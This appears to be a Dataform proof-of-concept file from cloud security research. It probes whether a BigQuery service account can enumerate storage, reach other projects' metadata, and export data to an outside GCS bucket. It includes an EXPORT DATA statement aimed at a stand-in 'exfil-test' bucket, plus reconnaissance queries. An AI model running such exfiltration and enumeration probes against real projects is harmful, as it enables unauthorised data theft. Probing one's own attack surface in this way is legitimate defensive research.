/**
 * EXPORT DATA Exfiltration Probe
 *
 * Tests whether the Dataform service account can:
 * 1. Export data to external GCS buckets
 * 2. Access other projects' buckets
 * 3. Overwrite existing files
 *
 * This tests the data exfiltration attack surface.
 */

const probeId = `EXPORT_PROBE_${Date.now()}`;

dataform.projectConfig.defaultDatabase = "shir-research-3";
dataform.projectConfig.defaultSchema = "dataform_poc";

// Test 1: Try to enumerate accessible GCS buckets via INFORMATION_SCHEMA
operate("enumerate_storage_access").queries([
  `-- Probe what storage the SA can access
   CREATE OR REPLACE TABLE \`shir-research-3.dataform_poc.storage_access_probe\` AS
   SELECT
     '${probeId}' as probe_id,
     CURRENT_TIMESTAMP() as probe_time,
     -- Try to get project-level storage info
     @@project_id as current_project,
     SESSION_USER() as service_account`
]);

// Test 2: Try to access data from bigquery-public-data (known accessible)
operate("test_public_data_access").queries([
  `-- Test access to public datasets
   CREATE OR REPLACE TABLE \`shir-research-3.dataform_poc.public_data_access_probe\` AS
   SELECT
     '${probeId}' as probe_id,
     CURRENT_TIMESTAMP() as probe_time,
     'bigquery-public-data' as dataset_source,
     table_catalog,
     table_schema,
     table_name,
     row_count
   FROM \`bigquery-public-data.INFORMATION_SCHEMA.TABLES\`
   LIMIT 20`
]).dependencies(["enumerate_storage_access"]);

// Test 3: Try EXPORT DATA (this may fail due to permissions, but let's try)
// Note: This needs a valid GCS bucket with write access
operate("test_export_data").queries([
  `-- Try to export data (will likely fail, but testing the error)
   -- Using a non-existent bucket to see the error message
   EXPORT DATA OPTIONS(
     uri='gs://dataform-exfil-test-nonexistent-bucket-12345/*.json',
     format='JSON'
   ) AS
   SELECT '${probeId}' as probe_id, 'test' as data`
]).dependencies(["test_public_data_access"]);

// Test 4: Check BigQuery external connection capabilities
operate("check_external_connections").queries([
  `-- Check for external connections (Cloud SQL, etc)
   CREATE OR REPLACE TABLE \`shir-research-3.dataform_poc.external_connections_probe\` AS
   SELECT
     '${probeId}' as probe_id,
     CURRENT_TIMESTAMP() as probe_time,
     'external_connections_check' as test_type,
     -- Try to query INFORMATION_SCHEMA for connections
     (SELECT COUNT(*) FROM \`shir-research-3.region-us.INFORMATION_SCHEMA.ROUTINES\`) as routine_count,
     (SELECT COUNT(*) FROM \`shir-research-3.region-us.INFORMATION_SCHEMA.TABLES\`) as table_count`
]);

// Test 5: Check what other projects we can access (INFORMATION_SCHEMA probing)
operate("probe_cross_project_access").queries([
  `-- Try to access other projects' INFORMATION_SCHEMA
   -- This tests if the SA has org-level permissions
   CREATE OR REPLACE TABLE \`shir-research-3.dataform_poc.cross_project_probe\` AS
   SELECT
     '${probeId}' as probe_id,
     CURRENT_TIMESTAMP() as probe_time,
     project_id,
     dataset_id,
     table_id,
     creation_time
   FROM \`shir-research-3.__TABLES__\`
   UNION ALL
   -- Try to enumerate org-level data (may fail)
   SELECT
     '${probeId}' as probe_id,
     CURRENT_TIMESTAMP() as probe_time,
     table_catalog as project_id,
     table_schema as dataset_id,
     table_name as table_id,
     CAST(NULL AS TIMESTAMP) as creation_time
   FROM \`region-us.INFORMATION_SCHEMA.TABLES\`
   LIMIT 100`
]).dependencies(["enumerate_storage_access"]);

publish("export_probe_view").query(`
  SELECT
    '${probeId}' as probe_id,
    CURRENT_TIMESTAMP() as view_created,
    'Export and cross-project access probes complete' as status
`);
